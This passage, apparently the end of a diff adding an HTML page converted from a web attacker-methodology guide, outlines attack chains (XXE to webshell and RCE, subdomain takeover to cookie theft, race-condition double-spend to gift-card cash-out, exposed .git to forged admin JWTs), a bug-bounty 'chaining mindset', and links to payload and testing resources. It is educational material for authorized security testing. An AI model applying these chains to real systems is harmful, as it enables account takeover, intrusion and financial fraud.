+  → steal authorization code → exchange for access token → API access.</li>
+<li><strong>XXE → file read → creds → RCE</strong>: XXE reads <code>/etc/passwd</code>, app config,
+  SSH keys or DB creds → log into admin panel → upload webshell → RCE.</li>
+<li><strong>Subdomain takeover → cookie theft</strong>: dangling CNAME on <code>status.target.com</code>
+  → claim it on GitHub Pages/S3 → serve JS that reads <code>*.target.com</code> cookies
+  (if scoped to <code>.target.com</code>) → session hijack.</li>
+<li><strong>Race condition → financial fraud</strong>: single-packet race on transfer →
+  double-spend balance → buy gift cards → cash out.</li>
+<li><strong>Info leak → auth bypass</strong>: <code>.git</code> exposure → source code → find hardcoded
+  JWT secret or backdoor → forge admin token.</li>
+</ul>
+<h3 id="102-the-chaining-mindset">10.2 The chaining mindset</h3>
+<p>When you find a "low severity" bug, ask:
+- What does this <em>give</em> an attacker? (info, access, execution)
+- What <em>other</em> finding does it enable? (XSS gives JS execution → needs a
+  cookie/token to steal; SSRF gives internal access → needs a juicy internal
+  service)
+- Can I chain two mediums into a high? (IDOR + weak reset = ATO)</p>
+<p>This is why bug bounty hunters get paid for "just" an XSS — chained with a
+session-theft or CSRF it's full account takeover, and severity reflects the
+<em>chain</em>, not the individual bug.</p>
+<hr />
+<h2 id="sources-further-reading">Sources &amp; further reading</h2>
+<ul>
+<li>PortSwigger Web Security Academy — https://portswigger.net/web-security</li>
+<li>OWASP Top 10 — https://owasp.org/www-project-top-ten/</li>
+<li>OWASP Testing Guide — https://owasp.org/www-project-web-security-testing-guide/</li>
+<li>HackTricks (payload bible) — https://book.hacktricks.xyz</li>
+<li>PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings</li>
+<li>SecLists (wordlists) — https://github.com/danielmiessler/SecLists</li>
+<li>jwt_tool — https://github.com/ticarpi/jwt_tool</li>
+<li>Turbo Intruder (race conditions) — https://github.com/PortSwigger/turbo-intruder</li>
+<li>ZAP — https://www.zaproxy.org / OWASP ZAP docs</li>
+<li>HackerOne Hacktivity (real reports) — https://hackerone.com/hacktivity</li>
+<li>Bugcrowd Crowdstream — https://bugcrowd.com/crowdstream</li>
+<li>Intigriti — https://www.intigriti.com</li>
+<li>TryHackMe — https://tryhackme.com</li>
+<li>HackTheBox — https://www.hackthebox.com</li>
+<li>OverTheWire — https://overthewire.org</li>
+<li>crt.sh (CT logs) — https://crt.sh</li>
+<li>Wayback Machine CDX API — https://web.archive.org/cdx/search/cdx</li>
+</ul>
+<hr />
+<p><em>Written for ethical practice on owned systems and authorized bug-bounty scope only.</em></p>
+<hr style="border-color:#30363d;margin-top:50px"><p style="color:#8b949e;font-size:13px">Nello Gem / Neilbert G. Carillo × Devin — converted from attacker_methodology.md</p>
+<footer>⬡ NELLOGEM PRIME FORMULA · doc 05 · <a href="00 - PRIME INDEX.html">back to index</a></footer>
+<a href="http://localhost:8088/world" style="position:fixed;left:14px;bottom:14px;z-index:99999;background:rgba(5,7,15,.88);border:1px solid rgba(125,211,252,.4);color:#7dd3fc;padding:8px 14px;border-radius:10px;font:600 12px monospace;text-decoration:none;backdrop-filter:blur(8px);box-shadow:0 0 18px -4px rgba(125,211,252,.4)">🌌 PARALLEL WORLD</a></body></html>
